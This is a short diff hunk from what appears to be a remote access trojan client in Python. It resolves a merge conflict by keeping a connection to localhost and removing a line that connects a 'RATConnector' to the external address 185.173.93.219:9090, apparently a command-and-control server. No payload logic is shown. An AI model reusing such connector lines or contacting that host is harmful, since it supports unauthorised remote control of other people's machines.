@@ -128,9 +128,5 @@ class Client:
 
 
 print("run")
-<<<<<<< HEAD
 ratClient = Client("127.0.0.1", 8080)
-=======
-ratClient = RATConnector("185.173.93.219", 9090)
->>>>>>> main
 ratClient.run()
